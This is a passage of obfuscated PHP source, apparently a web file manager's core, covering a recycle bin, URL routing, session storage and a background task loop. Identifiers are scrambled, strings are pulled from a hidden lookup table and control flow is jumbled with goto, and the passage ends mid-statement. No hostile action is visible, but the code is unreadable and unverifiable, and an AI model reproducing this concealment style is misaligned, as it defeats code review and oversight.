$cõôÉˆ˘úî = Cache::get($EÑÌ¿‚à±Â); goto c≥ÛÀ¥◊Öà; E”™ﬁ›ıãø: foreach ($fÑ◊“∆·Ç∂ as $Dí‰≈ûùË° => $fôôˆóïÁÒ) { $eàÏ¥¿‡π[$f¥üÕÖù≠ä[368]] = $this->fileTypeWhere($Dí‰≈ûùË°); $AŸ™«®äó’[$Dí‰≈ûùË°] = array($f¥üÕÖù≠ä[2341] => $fôôˆóïÁÒ[$f¥üÕÖù≠ä[28]], $f¥üÕÖù≠ä[2342] => $this->where($eàÏ¥¿‡π)->count(), $f¥üÕÖù≠ä[516] => $this->where($eàÏ¥¿‡π)->sum($f¥üÕÖù≠ä[77])); } Cache::set($EÑÌ¿‚à±Â, $AŸ™«®äó’, 1200); return $AŸ™«®äó’; goto c®®ªÕˆÇƒ; b¯Ø™ﬂÑƒ: $AŸ™«®äó’ = array(); $AŸ™«®äó’[$f¥üÕÖù≠ä[2340]] = array($f¥üÕÖù≠ä[2341] => LNG($f¥üÕÖù≠ä[2340]), $f¥üÕÖù≠ä[2342] => $this->where($eàÏ¥¿‡π)->count(), $f¥üÕÖù≠ä[516] => $this->where($eàÏ¥¿‡π)->sum($f¥üÕÖù≠ä[77])); $fÑ◊“∆·Ç∂ = KodIO::fileTypeList(); goto E”™ﬁ›ıãø; c≥ÛÀ¥◊Öà: if ($cõôÉˆ˘úî) { return $cõôÉˆ˘úî; } $eàÏ¥¿‡π = array($f¥üÕÖù≠ä[514] => 0); if ($b“†í∏Ùûª != !1) { $eàÏ¥¿‡π[$f¥üÕÖù≠ä[452]] = $b“†í∏Ùûª; $eàÏ¥¿‡π[$f¥üÕÖù≠ä[367]] = $Fù—õŒ—Ωâ; } goto b¯Ø™ﬂÑƒ; c®®ªÕˆÇƒ: } public function fileNameExist($CÒ∞ì∑öùˆ, $B© çâ˜◊Ç) { $CπﬁêóñÎ“ =& $_SERVER[¯èãÄπµ]; $e‰ÂÒÏﬁÆ¬ = $this->childList($CÒ∞ì∑öùˆ); foreach ($e‰ÂÒÏﬁÆ¬ as $eà‡¥ù”ŸÉ) { if ($eà‡¥ù”ŸÉ[$CπﬁêóñÎ“[28]] == $B© çâ˜◊Ç) { return $eà‡¥ù”ŸÉ[$CπﬁêóñÎ“[365]]; } } return !1; } public function childList($D‡Çú◊⁄Üû) { goto c∆ÿÉÌº÷Ê; EÆ»ÖË®Üù: self::$cacheChildList[$BÍØ ‘«] = $f«õ≥ªÙ»»; foreach ($f«õ≥ªÙ»» as $cÂâ∆Ò‰ÈÀ) { $BÍØ ‘« = $f∆¯ßêºÆö[406] . $cÂâ∆Ò‰ÈÀ[$f∆¯ßêºÆö[365]]; self::$cacheSourceInfo[$BÍØ ‘«] = $cÂâ∆Ò‰ÈÀ; } return $f«õ≥ªÙ»»; goto b∞‰ííù˜‹; fªÙÛ»Ç√Î: $báç›≤áŸ¥ = array($f∆¯ßêºÆö[457] => intval($D‡Çú◊⁄Üû), $f∆¯ßêºÆö[393] => 0); $f«õ≥ªÙ»» = $this->where($báç›≤áŸ¥)->select(); $f«õ≥ªÙ»» = $f«õ≥ªÙ»» ? $f«õ≥ªÙ»» : array(); goto EÆ»ÖË®Üù; c∆ÿÉÌº÷Ê: $f∆¯ßêºÆö =& $_SERVER[¯èãÄπµ]; $BÍØ ‘« = $f∆¯ßêºÆö[2320] . $D‡Çú◊⁄Üû; if (isset(self::$cacheChildList[$BÍØ ‘«])) { return self::$cacheChildList[$BÍØ ‘«]; } goto fªÙÛ»Ç√Î; b∞‰ííù˜‹: } public function fileNameAuto($aıéﬁ™öãä, $aÔÌØ„Ω∏ú, $E›⁄¬œÙ·È = REPEAT_RENAME, $Cô§”øÆù“ = false) { $Bêåé˜ÑÀ⁄ =& $_SERVER[¯èãÄπµ]; $Bπ›–§ôﬁÓ = $this->childList($aıéﬁ™öãä); $C∂´¥æÇÉå = array_to_keyvalue($Bπ›–§ôﬁÓ, $Bêåé˜ÑÀ⁄[33], $Bêåé˜ÑÀ⁄[28]); return $this->fileNameAutoGet($C∂´¥æÇÉå, $aÔÌØ„Ω∏ú, $E›⁄¬œÙ·È, $Cô§”øÆù“); } public function fileNameAutoGet($EÛ™«Ëè®À, $B¡∑€é∞ø∏, $Fè’‚ê∏Æ…, $DªøÉ√ﬁ◊‡) { $c≠ÔåˆÃ⁄‡ =& $_SERVER[¯èãÄπµ]; if ($Fè’‚ê∏Æ… == REPEAT_REPLACE || !$EÛ™«Ëè®À || !in_array_not_case($B¡∑€é∞ø∏, $EÛ™«Ëè®À) || $DªøÉ√ﬁ◊‡ && $Fè’‚ê∏Æ… != REPEAT_RENAME_FOLDER) { return $B¡∑€é∞ø∏; } if ($Fè’‚ê∏Æ… == REPEAT_SKIP) { return !1; } $Bé¯∑∏ë¢“ = $c≠ÔåˆÃ⁄‡[91] . get_path_ext($B¡∑€é∞ø∏); $Bé¯∑∏ë¢“ = $Bé¯∑∏ë¢“ == $c≠ÔåˆÃ⁄‡[91] || $DªøÉ√ﬁ◊‡ ? $c≠ÔåˆÃ⁄‡[33] : $Bé¯∑∏ë¢“; for ($cãÜÔ«µç¿ = 1; $cãÜÔ«µç¿ <= count($EÛ™«Ëè®À) + 1; $cãÜÔ«µç¿++) { $c‘ìÖ›Ñ†î = substr($B¡∑€é∞ø∏, 0, strlen($B¡∑€é∞ø∏) - strlen($Bé¯∑∏ë¢“)); $C≤çﬁñÉıû = $c‘ìÖ›Ñ†î . "\50{$cãÜÔ«µç¿}\51{$Bé¯∑∏ë¢“}"; if (!in_array_not_case($C≤çﬁñÉıû, $EÛ™«Ëè®À)) { return $C≤çﬁñÉıû; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\162\143\x65\137\x72\x65\x63\171\x63\154\145"; protected $dataAuto = array(array("\x63\x72\x65\141\164\x65\124\151\155\x65", "\x74\x69\155\x65", "\151\156\163\145\x72\x74", "\146\x75\156\143\x74\151\x6f\156")); public function listData($dúî®î›ßµ = false) { $A•à≥ÏÛ„ì =& $_SERVER[¯èãÄπµ]; $dúî®î›ßµ = $dúî®î›ßµ ? $dúî®î›ßµ : USER_ID; $d∏ÖãÚÉÉƒ = $this->where(array($A•à≥ÏÛ„ì[1415] => $dúî®î›ßµ))->select(); return array_to_keyvalue($d∏ÖãÚÉÉƒ, $A•à≥ÏÛ„ì[33], $A•à≥ÏÛ„ì[365]); } public function moveToRecycle($E–Ü‘Æìúè) { goto Cëóë“Ñ»∞; Cëóë“Ñ»∞: $eãΩ–ΩçÛ‚ =& $_SERVER[¯èãÄπµ]; $D™‚”íòœ∆ = Model($eãΩ–ΩçÛ‚[1112]); $FíÏòóÿù“ = $D™‚”íòœ∆->sourceInfo($E–Ü‘Æìúè); goto BìÖ¢ÕâÔŸ; fÑ˘ÔÂèª∆: $this->recycleMove($E–Ü‘Æìúè, 1); if ($FíÏòóÿù“[$eãΩ–ΩçÛ‚[366]] == $eãΩ–ΩçÛ‚[83]) { $d¢Âπ∆ßÑå = array($eãΩ–ΩçÛ‚[521] => array($eãΩ–ΩçÛ‚[479], $FíÏòóÿù“[$eãΩ–ΩçÛ‚[455]] . $E–Ü‘Æìúè . $eãΩ–ΩçÛ‚[480])); $D™‚”íòœ∆->where($d¢Âπ∆ßÑå)->setField($eãΩ–ΩçÛ‚[393], 1); } goto cÙƒÉ…ôô∂; BìÖ¢ÕâÔŸ: if (!$FíÏòóÿù“ || $FíÏòóÿù“[$eãΩ–ΩçÛ‚[393]] == $eãΩ–ΩçÛ‚[83]) { return; } $D´ë≠∞ﬂÿ≤ = array($eãΩ–ΩçÛ‚[379] => $E–Ü‘Æìúè, $eãΩ–ΩçÛ‚[1415] => USER_ID, $eãΩ–ΩçÛ‚[517] => $FíÏòóÿù“[$eãΩ–ΩçÛ‚[367]], $eãΩ–ΩçÛ‚[518] => $FíÏòóÿù“[$eãΩ–ΩçÛ‚[452]], $eãΩ–ΩçÛ‚[521] => $FíÏòóÿù“[$eãΩ–ΩçÛ‚[455]]); $this->add($D´ë≠∞ﬂÿ≤); goto fÑ˘ÔÂèª∆; cÙƒÉ…ôô∂: } public function clear() { $this->remove(!1); } public function remove($EÒû‚à–¿ë = false) { goto eò»ßê‚ﬁƒ; aÀæˆ˘Ø∆â: $EÒû‚à–¿ë = $EÒû‚à–¿ë === !1 ? !1 : $EÒû‚à–¿ë; $BÁ∆Òµ÷≥û = array(); foreach ($cŸö´∫í◊á as $A°ÁÀÊèÜõ) { if ($EÒû‚à–¿ë != !1 && !in_array($A°ÁÀÊèÜõ, $EÒû‚à–¿ë)) { continue; } $C⁄æ∞¥‡“ï->remove($A°ÁÀÊèÜõ, !1); $f∑´Ù◊†≤Î = $this->where(array($B¶òÃîË∫É[365] => $A°ÁÀÊèÜõ))->find(); $DéèôÖÿÔœ = $f∑´Ù◊†≤Î[$B¶òÃîË∫É[367]] . $B¶òÃîË∫É[70] . $f∑´Ù◊†≤Î[$B¶òÃîË∫É[452]]; $BÁ∆Òµ÷≥û[$DéèôÖÿÔœ] = array($B¶òÃîË∫É[517] => $f∑´Ù◊†≤Î[$B¶òÃîË∫É[367]], $B¶òÃîË∫É[452] => $f∑´Ù◊†≤Î[$B¶òÃîË∫É[452]]); $this->where(array($B¶òÃîË∫É[365] => $A°ÁÀÊèÜõ))->delete(); } goto D⁄íÎ áïı; eò»ßê‚ﬁƒ: $B¶òÃîË∫É =& $_SERVER[¯èãÄπµ]; $C⁄æ∞¥‡“ï = Model($B¶òÃîË∫É[1112]); $cŸö´∫í◊á = $this->listData(); goto aÀæˆ˘Ø∆â; D⁄íÎ áïı: foreach ($BÁ∆Òµ÷≥û as $cµ¯Îü–®ƒ) { $C⁄æ∞¥‡“ï->targetSpaceUpdate($cµ¯Îü–®ƒ[$B¶òÃîË∫É[367]], $cµ¯Îü–®ƒ[$B¶òÃîË∫É[452]]); } goto c›ˆÖÑ´Ù; c›ˆÖÑ´Ù: } public function restore($e¯¡ÑË‡°µ = false) { goto cﬁÉåØ˘î¢; cﬁÉåØ˘î¢: $Dﬁ¯Æ´Õ◊≈ =& $_SERVER[¯èãÄπµ]; $AîË°Ê‰∆ = Model($Dﬁ¯Æ´Õ◊≈[1112]); $Cü◊¥≤€â° = $this->listData(); goto eÀÕéª‚âú; eÖ¿∑ÛÇù˜: foreach ($Cü◊¥≤€â° as $a≤Ñ˘Àªõ∫) { goto a¶‹¯´Ã≥ç; A˘≤œ‚‹¯∆: $d∆‰Œàë·œ[] = $dÊí£ÈÌ⁄ã[$Dﬁ¯Æ´Õ◊≈[457]]; if ($dÊí£ÈÌ⁄ã[$Dﬁ¯Æ´Õ◊≈[366]] == $Dﬁ¯Æ´Õ◊≈[83]) { $d∆‰Œàë·œ[] = $a≤Ñ˘Àªõ∫; } $AîË°Ê‰∆->lockMoveEnd($a≤Ñ˘Àªõ∫); goto Eß®úéæÏ¬; aÇ·ÚÃã∂∞: if ($Cúûãƒäë‘[$Dﬁ¯Æ´Õ◊≈[393]] == $Dﬁ¯Æ´Õ◊≈[83]) { continue; } $AîË°Ê‰∆->lockMoveStart($a≤Ñ˘Àªõ∫); $this->recycleMove($a≤Ñ˘Àªõ∫, 0); goto D†ë∑¡ñæŒ; D†ë∑¡ñæŒ: if ($dÊí£ÈÌ⁄ã[$Dﬁ¯Æ´Õ◊≈[366]] == $Dﬁ¯Æ´Õ◊≈[83]) { $fﬂÿü£Ïø∞ = array($Dﬁ¯Æ´Õ◊≈[521] => array($Dﬁ¯Æ´Õ◊≈[479], $dÊí£ÈÌ⁄ã[$Dﬁ¯Æ´Õ◊≈[455]] . $a≤Ñ˘Àªõ∫ . $Dﬁ¯Æ´Õ◊≈[480])); $AîË°Ê‰∆->where($fﬂÿü£Ïø∞)->setField($Dﬁ¯Æ´Õ◊≈[393], 0); $this->restoreFolderChildren($a≤Ñ˘Àªõ∫, $Cü◊¥≤€â°); } $this->where(array($Dﬁ¯Æ´Õ◊≈[365] => $a≤Ñ˘Àªõ∫))->delete(); $AîË°Ê‰∆->folderSizeReset($dÊí£ÈÌ⁄ã[$Dﬁ¯Æ´Õ◊≈[457]]); goto A˘≤œ‚‹¯∆; a¶‹¯´Ã≥ç: if ($e¯¡ÑË‡°µ != !1 && !in_array($a≤Ñ˘Àªõ∫, $e¯¡ÑË‡°µ)) { continue; } $dÊí£ÈÌ⁄ã = $AîË°Ê‰∆->sourceInfo($a≤Ñ˘Àªõ∫); $Cúûãƒäë‘ = $AîË°Ê‰∆->sourceInfo($dÊí£ÈÌ⁄ã[$Dﬁ¯Æ´Õ◊≈[457]]); goto aÇ·ÚÃã∂∞; Eß®úéæÏ¬: } $AîË°Ê‰∆->updateModifyTime($d∆‰Œàë·œ); goto C‘ëìÜŒ∏; eÀÕéª‚âú: $e¯¡ÑË‡°µ = $e¯¡ÑË‡°µ == !1 ? !1 : $e¯¡ÑË‡°µ; if (!$Cü◊¥≤€â°) { return !0; } $d∆‰Œàë·œ = array(); goto eÖ¿∑ÛÇù˜; C‘ëìÜŒ∏: } private function restoreFolderChildren($b·‡·ñê¨∂, $D‹Ñª…®˘Ù) { goto EÉÂÕâë·º; dëÿ¯ÑêáË: foreach ($D‹Ñª…®˘Ù as $Cé≥ÊÔù¿∏) { if ($Cé≥ÊÔù¿∏ == $b·‡·ñê¨∂) { continue; } if (!$eÊÊø◊◊¥õ->isParentOf($b·‡·ñê¨∂, $Cé≥ÊÔù¿∏)) { continue; } $dùçæÌ◊ÍÖ = $eÊÊø◊◊¥õ->sourceInfo($Cé≥ÊÔù¿∏); if ($dùçæÌ◊ÍÖ[$FÜ€àæÂ˘è[366]] == $FÜ€àæÂ˘è[83]) { $aÏâ“ïß‚Ò[] = array($FÜ€àæÂ˘è[521] => array($FÜ€àæÂ˘è[479], $dùçæÌ◊ÍÖ[$FÜ€àæÂ˘è[455]] . $Cé≥ÊÔù¿∏ . $FÜ€àæÂ˘è[480])); } else { $aÏâ“ïß‚Ò[$FÜ€àæÂ˘è[365]][1][] = $Cé≥ÊÔù¿∏; } } if (!$aÏâ“ïß‚Ò[$FÜ€àæÂ˘è[365]][1]) { unset($aÏâ“ïß‚Ò[$FÜ€àæÂ˘è[365]]); } if (!$aÏâ“ïß‚Ò) { return; } goto dÀÏ…œ˜ìî; dÀÏ…œ˜ìî: $aÏâ“ïß‚Ò[$FÜ€àæÂ˘è[365]][1] = array_unique($aÏâ“ïß‚Ò[$FÜ€àæÂ˘è[365]][1]); $aÏâ“ïß‚Ò[$FÜ€àæÂ˘è[918]] = $FÜ€àæÂ˘è[2167]; $eÊÊø◊◊¥õ->where($aÏâ“ïß‚Ò)->setField($FÜ€àæÂ˘è[393], 1); goto BÈÑã¨‹‚ò; EÉÂÕâë·º: $FÜ€àæÂ˘è =& $_SERVER[¯èãÄπµ]; $eÊÊø◊◊¥õ = Model($FÜ€àæÂ˘è[1112]); $aÏâ“ïß‚Ò = array($FÜ€àæÂ˘è[365] => array($FÜ€àæÂ˘è[7], array())); goto dëÿ¯ÑêáË; BÈÑã¨‹‚ò: } private function recycleMove($Aôïîﬂÿ…É, $Eâ¥åä¶ú = 1) { $D¶·áµœØã =& $_SERVER[¯èãÄπµ]; $aÃËÖ©€⁄ñ = Model($D¶·áµœØã[1112]); $b¢áÉ√ß€é = Model($D¶·áµœØã[2343]); $Eÿƒ™•∏∫È = array($D¶·áµœØã[365] => $Aôïîﬂÿ…É); if ($Eâ¥åä¶ú) { $aÃËÖ©€⁄ñ->where($Eÿƒ™•∏∫È)->setField($D¶·áµœØã[393], 1); $b¢áÉ√ß€é->eventRecycle($Aôïîﬂÿ…É, $D¶·áµœØã[2344]); } else { $A ÿâ≥ê•Ñ = $aÃËÖ©€⁄ñ->where($Eÿƒ™•∏∫È)->find(); $eèœ»© Ω¢ = $A ÿâ≥ê•Ñ[$D¶·áµœØã[366]] == $D¶·áµœØã[83]; $F•èó¿Ç´ø = $aÃËÖ©€⁄ñ->fileNameAuto($A ÿâ≥ê•Ñ[$D¶·áµœØã[457]], $A ÿâ≥ê•Ñ[$D¶·áµœØã[28]], REPEAT_RENAME_FOLDER, $eèœ»© Ω¢); if ($F•èó¿Ç´ø != $A ÿâ≥ê•Ñ[$D¶·áµœØã[28]]) { $aÃËÖ©€⁄ñ->rename($Aôïîﬂÿ…É, $F•èó¿Ç´ø); } $aÃËÖ©€⁄ñ->where($Eÿƒ™•∏∫È)->setField($D¶·áµœØã[393], 0); $b¢áÉ√ß€é->eventRecycle($Aôïîﬂÿ…É, $D¶·áµœØã[2345]); } } } goto FÜöóˆÆÀ˘; fæÚﬁ·…À≈: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\133\136\57\135\x2b", "\x3a\156\x75\155" => "\133\x30\55\x39\135\x2b", "\x3a\141\x6c\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($aõÆµ∆∂¢”, $B˘ùƒá¡ã„) { $E¢ö±ÖÁ¥Á =& $_SERVER[¯èãÄπµ]; if ($aõÆµ∆∂¢” == $E¢ö±ÖÁ¥Á[1373]) { $E˘∂¥‹ÇÉ´ = array_map($E¢ö±ÖÁ¥Á[1374], $B˘ùƒá¡ã„[0]); $A»◊ë≤ëÒª = strpos($B˘ùƒá¡ã„[1], $E¢ö±ÖÁ¥Á[8]) === 0 ? $B˘ùƒá¡ã„[1] : $E¢ö±ÖÁ¥Á[8] . $B˘ùƒá¡ã„[1]; $CØÎ∆ô√¨É = $B˘ùƒá¡ã„[2]; } else { $E˘∂¥‹ÇÉ´ = null; $A»◊ë≤ëÒª = strpos($B˘ùƒá¡ã„[0], $E¢ö±ÖÁ¥Á[8]) === 0 ? $B˘ùƒá¡ã„[0] : $E¢ö±ÖÁ¥Á[8] . $B˘ùƒá¡ã„[0]; $CØÎ∆ô√¨É = $B˘ùƒá¡ã„[1]; } array_push(self::$maps, $E˘∂¥‹ÇÉ´); array_push(self::$routes, $A»◊ë≤ëÒª); array_push(self::$methods, strtoupper($aõÆµ∆∂¢”)); array_push(self::$callbacks, $CØÎ∆ô√¨É); } public static function error($C®õõ¶Èä∆) { self::$errorCallback = $C®õõ¶Èä∆; } public static function haltOnMatch($Eª∆÷†à”‚ = true) { self::$halts = $Eª∆÷†à”‚; } public static function dispatch() { goto eõôøÜË€Ö; eõôøÜË€Ö: $B∂ÑëØΩ‘Ÿ =& $_SERVER[¯èãÄπµ]; $bØçŸ•‡Æ£ = parse_url($_SERVER[$B∂ÑëØΩ‘Ÿ[1375]], PHP_URL_PATH); $cë∞‰å¯Áæ = $_SERVER[$B∂ÑëØΩ‘Ÿ[150]]; goto a‹€œå‰ëó; cêó”é”üÉ: self::$routes = preg_replace($B∂ÑëØΩ‘Ÿ[1075], $B∂ÑëØΩ‘Ÿ[8], self::$routes); if (in_array($bØçŸ•‡Æ£, self::$routes)) { $c”ïÉ…ˆØ– = array_keys(self::$routes, $bØçŸ•‡Æ£); foreach ($c”ïÉ…ˆØ– as $E˘éÊÇàò®) { if (self::$methods[$E˘éÊÇàò®] == $cë∞‰å¯Áæ || self::$methods[$E˘éÊÇàò®] == $B∂ÑëØΩ‘Ÿ[1376] || in_array($cë∞‰å¯Áæ, self::$maps[$E˘éÊÇàò®])) { $cë¿ä–ü´⁄ = !0; if (!is_object(self::$callbacks[$E˘éÊÇàò®])) { $C€”Îà•Î÷ = explode($B∂ÑëØΩ‘Ÿ[8], self::$callbacks[$E˘éÊÇàò®]); $a’¯ÜÊ◊Ü¢ = end($C€”Îà•Î÷); $A⁄Î≈Ë™ŸÂ = explode($B∂ÑëØΩ‘Ÿ[1377], $a’¯ÜÊ◊Ü¢); $fÉ£œèä∫ã = new $A⁄Î≈Ë™ŸÂ[0](); $fÉ£œèä∫ã->{$A⁄Î≈Ë™ŸÂ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$E˘éÊÇàò®]); if (self::$halts) { return; } } } } } else { $EÒ÷ë©‡å√ = 0; foreach (self::$routes as $E˘éÊÇàò®) { if (strpos($E˘éÊÇàò®, $B∂ÑëØΩ‘Ÿ[4]) !== !1) { $E˘éÊÇàò® = str_replace($BÇ´»ı ‡Ö, $E¿Êõ ¡òÉ, $E˘éÊÇàò®); } if (preg_match($B∂ÑëØΩ‘Ÿ[1378] . $E˘éÊÇàò® . $B∂ÑëØΩ‘Ÿ[1379], $bØçŸ•‡Æ£, $F‡≤Ù≠∆í…)) { if (self::$methods[$EÒ÷ë©‡å√] == $cë∞‰å¯Áæ || self::$methods[$EÒ÷ë©‡å√] == $B∂ÑëØΩ‘Ÿ[1376] || !empty(self::$maps[$EÒ÷ë©‡å√]) && in_array($cë∞‰å¯Áæ, self::$maps[$EÒ÷ë©‡å√])) { $cë¿ä–ü´⁄ = !0; array_shift($F‡≤Ù≠∆í…); if (!is_object(self::$callbacks[$EÒ÷ë©‡å√])) { $C€”Îà•Î÷ = explode($B∂ÑëØΩ‘Ÿ[8], self::$callbacks[$EÒ÷ë©‡å√]); $a’¯ÜÊ◊Ü¢ = end($C€”Îà•Î÷); $A⁄Î≈Ë™ŸÂ = explode($B∂ÑëØΩ‘Ÿ[1377], $a’¯ÜÊ◊Ü¢); $fÉ£œèä∫ã = new $A⁄Î≈Ë™ŸÂ[0](); if (!method_exists($fÉ£œèä∫ã, $A⁄Î≈Ë™ŸÂ[1])) { echo $B∂ÑëØΩ‘Ÿ[1380]; } else { call_user_func_array(array($fÉ£œèä∫ã, $A⁄Î≈Ë™ŸÂ[1]), $F‡≤Ù≠∆í…); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$EÒ÷ë©‡å√], $F‡≤Ù≠∆í…); if (self::$halts) { return; } } } } $EÒ÷ë©‡å√++; } } if ($cë¿ä–ü´⁄ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $D¿ª∂Óƒëª =& $_SERVER[¯èãÄπµ]; header($_SERVER[$D¿ª∂Óƒëª[1381]] . $D¿ª∂Óƒëª[1382]); echo $D¿ª∂Óƒëª[1383]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$B∂ÑëØΩ‘Ÿ[1375]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto b‡œœø‰Ñ; a‹€œå‰ëó: $BÇ´»ı ‡Ö = array_keys(static::$patterns); $E¿Êõ ¡òÉ = array_values(static::$patterns); $cë¿ä–ü´⁄ = !1; goto cêó”é”üÉ; b‡œœø‰Ñ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto cà ª⁄Â›æ; cà ª⁄Â›æ: $B˜˜è€≥¬ñ =& $_SERVER[¯èãÄπµ]; static $BÛøÛ¨ëö∆ = false; if ($BÛøÛ¨ëö∆) { return $BÛøÛ¨ëö∆; } goto eÙıËÌƒ’ë; E¬¿£‘÷è¥: switch ($eë≤≥é®·“) { case $B˜˜è€≥¬ñ[17]: self::$handle = Model($B˜˜è€≥¬ñ[758]); break; case $B˜˜è€≥¬ñ[759]: self::$handle = new CacheRedis($eäßßæ°·≤, $b·≥ﬁÊØÒª); break; case $B˜˜è€≥¬ñ[760]: self::$handle = new CacheMemcached($eäßßæ°·≤, $b·≥ﬁÊØÒª); break; case $B˜˜è€≥¬ñ[163]: $eäßßæ°·≤[$B˜˜è€≥¬ñ[75]] = $eäßßæ°·≤[$B˜˜è€≥¬ñ[75]] . $B˜˜è€≥¬ñ[1387]; self::$handle = new CacheFile($eäßßæ°·≤, $b·≥ﬁÊØÒª); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $BÛøÛ¨ëö∆ = new self(); goto eà¶ÖÛüà ; b¨±ÖÚé“é: $eë≤≥é®·“ = $f‰ËÛß∞≠‹[$B˜˜è€≥¬ñ[1386]]; $eäßßæ°·≤ = $f‰ËÛß∞≠‹[$eë≤≥é®·“]; $b·≥ﬁÊØÒª = $f‰ËÛß∞≠‹[$B˜˜è€≥¬ñ[757]]; goto E¬¿£‘÷è¥; eÙıËÌƒ’ë: $f‰ËÛß∞≠‹ = $GLOBALS[$B˜˜è€≥¬ñ[6]][$B˜˜è€≥¬ñ[333]]; self::$sessionTime = $f‰ËÛß∞≠‹[$B˜˜è€≥¬ñ[1384]]; $D≈èæÙ¿ª„ = SESSION_ID; goto FÀ∂ƒí≠¥¥; eà¶ÖÛüà : return $BÛøÛ¨ëö∆; goto Dá≠ıØ©˘»; FÀ∂ƒí≠¥¥: $D≈èæÙ¿ª„ = _get($GLOBALS, $B˜˜è€≥¬ñ[1385], $D≈èæÙ¿ª„); if (self::$sessionSign) { } else { if (Cookie::get($D≈èæÙ¿ª„)) { self::$sessionSign = Cookie::get($D≈èæÙ¿ª„); } else { self::$sessionSign = guid(); } } Cookie::setSafe($D≈èæÙ¿ª„, self::$sessionSign, self::$sessionTime); goto b¨±ÖÚé“é; Dá≠ıØ©˘»: } public static function sign($dΩ°ôŸ©·Ã = false) { $dΩ°ôŸ©·Ã && (self::$sessionSign = $dΩ°ôŸ©·Ã); self::init(); return self::$sessionSign; } public static function set($cè¨à Œê±, $aú⁄∑Ωﬁÿõ = false) { self::init(); if (is_array($cè¨à Œê±)) { foreach ($cè¨à Œê± as $AœûÂ¬Ã„æ => $FÏÚÉÖ›≈„) { array_set_value(self::$data, $AœûÂ¬Ã„æ, $FÏÚÉÖ›≈„); } } else { array_set_value(self::$data, $cè¨à Œê±, $aú⁄∑Ωﬁÿõ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($d™éåÚˆ≠≤ = false) { self::init(); if (!$d™éåÚˆ≠≤) { return self::$data; } return array_get_value(self::$data, $d™éåÚˆ≠≤); } public static function remove($f†ùÜ†∫˜Ë) { self::init(); unset(self::$data[$f†ùÜ†∫˜Ë]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¯èãÄπµ][762])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto cËÉÿõ√•Í; dÊ¢÷√ùÈ‚: while (!0) { self::cacheClear(); if (self::valueGet($fÂå÷ÎÌ˜í[692]) != $fÂå÷ÎÌ˜í[83]) { self::valueSet($fÂå÷ÎÌ˜í[1388], $fÂå÷ÎÌ˜í[464]); self::log($fÂå÷ÎÌ˜í[1392]); die; } self::valueSet($fÂå÷ÎÌ˜í[1388], $fÂå÷ÎÌ˜í[83]); self::valueSet($fÂå÷ÎÌ˜í[1389], time()); self::taskRunAll(); sleep(self::valueGet($fÂå÷ÎÌ˜í[1393])); } goto D≥Ê•≥Èå±; cËÉÿõ√•Í: $fÂå÷ÎÌ˜í =& $_SERVER[¯èãÄπµ]; if (self::valueGet($fÂå÷ÎÌ˜í[692]) != $fÂå÷ÎÌ˜í[83]) { return; } if (self::valueGet($fÂå÷ÎÌ˜í[1388]) == $fÂå÷ÎÌ˜í[83]) { $c∏–Ò∫±Ωê = self::valueGet($fÂå÷ÎÌ˜í[1389]); if (time() - $c∏–Ò∫±Ωê > 3600 * 2) { self::restart(); } return; } goto Cä˜å™ﬂâ; Cä˜å™ﬂâ: http_close(); self::valueSet($fÂå÷ÎÌ˜í[1388], $fÂå÷ÎÌ˜í[83]); Hook::bind($fÂå÷ÎÌ˜í[1390], $fÂå÷ÎÌ˜í[1391]); goto dÊ¢÷√ùÈ‚; D≥Ê•≥Èå±: } public static function restart() { $Cë÷Â•áÜù =& $_SERVER[¯èãÄπµ]; http_close(); self::valueSet($Cë÷Â•áÜù[692], $Cë÷Â•áÜù[464]); sleep(self::valueGet($Cë÷Â•áÜù[1393]) + 5); self::valueSet($Cë÷Â•áÜù[1388], $Cë÷Â•áÜù[464]); self::valueSet($Cë÷Â•áÜù[692], $Cë÷Â•áÜù[83]); } public static function shutdownEvent() { $Dπ°ã—ëÈ® =& $_SERVER[¯èãÄπµ]; self::valueSet($Dπ°ã—ëÈ®[1388], $Dπ°ã—ëÈ®[464]); self::log($Dπ°ã—ëÈ®[1394]); } public static function config($Bµøìà–íÊ, $c†„ùÂêÃÆ) { $dê¯óñ⁄±” =& $_SERVER[¯èãÄπµ]; $Bé‚”´ﬁÕ± = 20; $c†„ùÂêÃÆ = intval($c†„ùÂêÃÆ) <= $Bé‚”´ﬁÕ± ? $Bé‚”´ﬁÕ± : intval($c†„ùÂêÃÆ); self::valueSet($dê¯óñ⁄±”[692], $Bµøìà–íÊ); self::valueSet($dê¯óñ⁄±”[1393], $c†„ùÂêÃÆ); } private static function taskRunAll() { $bàıœêè±µ =& $_SERVER[¯èãÄπµ]; $EâéèÃªÛü = Model($bàıœêè±µ[1395])->listData(); $bˆÎÒÙ€ú = count($EâéèÃªÛü); for ($d…Î’ËÉÁÀ = 0; $d…Î’ËÉÁÀ < $bˆÎÒÙ€ú; $d…Î’ËÉÁÀ++) { $b¿Ñû™Ñ≥ = $EâéèÃªÛü[$d…Î’ËÉÁÀ]; if ($b¿Ñû™Ñ≥[$bàıœêè±µ[1396]] != $bàıœêè±µ[83]) { continue; } if (!self::taskTimeCheck($b¿Ñû™Ñ≥)) { continue; } self::taskRun($b¿Ñû™Ñ≥); } Hook::trigger($bàıœêè±µ[1397]); } private static function taskTimeCheck($eºƒ‚¯Âê¢) { goto 